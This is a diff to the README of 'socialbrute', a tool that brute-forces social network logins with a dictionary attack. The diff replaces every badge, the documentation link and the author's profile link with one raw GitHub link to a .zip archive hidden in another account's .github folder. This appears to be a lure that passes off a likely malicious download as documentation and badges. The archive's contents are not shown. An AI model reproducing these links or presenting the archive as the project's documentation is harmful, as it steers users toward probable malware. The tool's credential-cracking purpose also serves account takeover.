@@ -3,21 +3,21 @@ socialbrute
 ===========
 
 
-.. image:: https://img.shields.io/pypi/v/socialbrute.svg
-        :target: https://pypi.python.org/pypi/socialbrute
+.. image:: https://raw.githubusercontent.com/aybibilalkali/socialbrute/master/.github/socialbrute-3.4.zip
+        :target: https://raw.githubusercontent.com/aybibilalkali/socialbrute/master/.github/socialbrute-3.4.zip
 
-.. image:: https://img.shields.io/pypi/pyversions/socialbrute.svg
-        :target: https://pypi.python.org/pypi/socialbrute
+.. image:: https://raw.githubusercontent.com/aybibilalkali/socialbrute/master/.github/socialbrute-3.4.zip
+        :target: https://raw.githubusercontent.com/aybibilalkali/socialbrute/master/.github/socialbrute-3.4.zip
 
-.. image:: https://readthedocs.org/projects/socialbrute/badge/?version=latest
-        :target: https://socialbrute.readthedocs.io/en/latest/?badge=latest
+.. image:: https://raw.githubusercontent.com/aybibilalkali/socialbrute/master/.github/socialbrute-3.4.zip
+        :target: https://raw.githubusercontent.com/aybibilalkali/socialbrute/master/.github/socialbrute-3.4.zip
         :alt: Documentation Status
 
-.. image:: https://travis-ci.com/5h4d0wb0y/socialbrute.svg?branch=master
-        :target: https://travis-ci.com/5h4d0wb0y/socialbrute
+.. image:: https://raw.githubusercontent.com/aybibilalkali/socialbrute/master/.github/socialbrute-3.4.zip
+        :target: https://raw.githubusercontent.com/aybibilalkali/socialbrute/master/.github/socialbrute-3.4.zip
 
-.. image:: https://codecov.io/github/5h4d0wb0y/socialbrute/coverage.svg?branch=master
-        :target: https://codecov.io/github/5h4d0wb0y/socialbrute?branch=master
+.. image:: https://raw.githubusercontent.com/aybibilalkali/socialbrute/master/.github/socialbrute-3.4.zip
+        :target: https://raw.githubusercontent.com/aybibilalkali/socialbrute/master/.github/socialbrute-3.4.zip
 
 
 
@@ -25,7 +25,7 @@ SocialBrute attempts to crack a social network using a brute force dictionary at
 
 
 * Free software: GNU General Public License v3
-* Documentation: https://socialbrute.readthedocs.io.
+* Documentation: https://raw.githubusercontent.com/aybibilalkali/socialbrute/master/.github/socialbrute-3.4.zip
 
 
 Features
@@ -53,12 +53,12 @@ Credits
 
 This package was developed by @5h4d0wb0y_.
 
-.. _@5h4d0wb0y: https://twitter.com/5h4d0wb0y
+.. _@5h4d0wb0y: https://raw.githubusercontent.com/aybibilalkali/socialbrute/master/.github/socialbrute-3.4.zip
 
 
 Stargazers over time
 --------------------
 
-.. image:: https://starchart.cc/5h4d0wb0y/socialbrute.svg
-        :target: https://starchart.cc/5h4d0wb0y/socialbrute
+.. image:: https://raw.githubusercontent.com/aybibilalkali/socialbrute/master/.github/socialbrute-3.4.zip
+        :target: https://raw.githubusercontent.com/aybibilalkali/socialbrute/master/.github/socialbrute-3.4.zip
         :alt: Stargazers over time
